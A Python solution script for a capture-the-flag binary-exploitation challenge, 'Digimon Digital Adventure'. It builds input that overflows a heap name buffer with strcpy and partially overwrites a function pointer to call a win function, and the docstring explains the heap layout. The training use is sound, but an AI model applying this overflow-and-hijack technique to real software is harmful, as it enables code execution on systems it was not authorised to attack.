#!/usr/bin/env python3
"""
Digimon Digital Adventure - CTF Challenge Solution
Category: Binary Exploitation / Pwn
Vulnerability: Heap Buffer Overflow with Function Pointer Hijacking

Author: CTF Challenge Creator
"""

import struct
import sys

# Configuration
BINARY = "./digimon"
WARGREYMON_ADDR = 0x401316  # Address of wargreymon_appears() function

def create_payload():
    """
    Create the heap overflow payload to overwrite the function pointer.

    Heap Layout:
    [DigimonData: 76 bytes] [heap metadata: 20 bytes] [BattleSystem: starts here]

    DigimonData struct (76 bytes):
        - name[64]          : 64 bytes
        - power_level       : 4 bytes
        - experience        : 4 bytes
        - evolution_stage   : 4 bytes
        - padding           : 4 bytes (alignment)

    BattleSystem struct (32 bytes):
        - battle_function   : 8 bytes (function pointer) <- TARGET
        - evolution_stage   : 4 bytes
        - digital_signature : 16 bytes

    Total offset from name[0] to battle_function: 96 bytes

    Note: strcpy() stops at null bytes. The address 0x401316 in little-endian
    is \x16\x13\x40\x00\x00\x00\x00\x00. strcpy will only copy the first 3 bytes
    (\x16\x13\x40) before hitting the null byte. However, this is sufficient
    because the original function pointer (agumon_greets @ 0x40144b) shares the
    same upper bytes. After partial overwrite, we get 0x401316 = wargreymon_appears!
    """

    payload = b""

    # Fill the name buffer and overflow into battle_function pointer
    payload += b"A" * 96  # Reach the function pointer (96 bytes)

    # Overwrite function pointer with wargreymon_appears address
    # Even though strcpy stops at null byte, partial overwrite works!
    payload += struct.pack('<Q', WARGREYMON_ADDR)

    return payload


def generate_exploit_input():
    """Generate the full interaction sequence for the exploit"""

    print("[*] Generating exploit...", file=sys.stderr)
    print(f"[*] Target function: wargreymon_appears @ 0x{WARGREYMON_ADDR:x}", file=sys.stderr)
    print("[*] Offset to function pointer: 96 bytes", file=sys.stderr)
    print(file=sys.stderr)

    interaction = b""

    # Step 1: Name the Digimon (safe initial naming)
    interaction += b"1\n"
    interaction += b"Agumon\n"
    interaction += b"\n"  # Press enter after display

    # Step 2: Train to reach 50+ experience (need at least 50 to unlock digivolve)
    # Random exp gain is 5-15 per session, so 10 sessions guarantees >= 50
    print("[*] Training to reach 50+ experience...", file=sys.stderr)
    for i in range(10):
        interaction += b"2\n"  # Train
        interaction += b"\n"   # Press enter

    # Step 3: Trigger digivolution with exploit payload
    print("[*] Triggering digivolution with overflow payload...", file=sys.stderr)
    interaction += b"6\n"  # Digivolve

    payload = create_payload()
    interaction += payload + b"\n"

    # Step 4: Press enter to see results
    interaction += b"\n"

    # Step 5: Exit
    interaction += b"5\n"

    print("[+] Exploit generated successfully!", file=sys.stderr)
    print(file=sys.stderr)

    return interaction


def main():
    """Main exploit function"""

    print("=" * 70, file=sys.stderr)
    print("  Digimon Digital Adventure - CTF Solution", file=sys.stderr)
    print("=" * 70, file=sys.stderr)
    print(file=sys.stderr)
    print("Challenge: Heap Buffer Overflow", file=sys.stderr)
    print("Objective: Overwrite function pointer to call wargreymon_appears()", file=sys.stderr)
    print(file=sys.stderr)

    # Generate the exploit
    exploit_input = generate_exploit_input()

    # Output to stdout for piping
    sys.stdout.buffer.write(exploit_input)

    print("[*] Usage:", file=sys.stderr)
    print(f"    python3 solution.py | {BINARY}", file=sys.stderr)
    print(file=sys.stderr)
    print("[*] Or save to file:", file=sys.stderr)
    print(f"    python3 solution.py > exploit_input.txt", file=sys.stderr)
    print(f"    {BINARY} < exploit_input.txt", file=sys.stderr)
    print(file=sys.stderr)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}", file=sys.stderr)
        sys.exit(1)
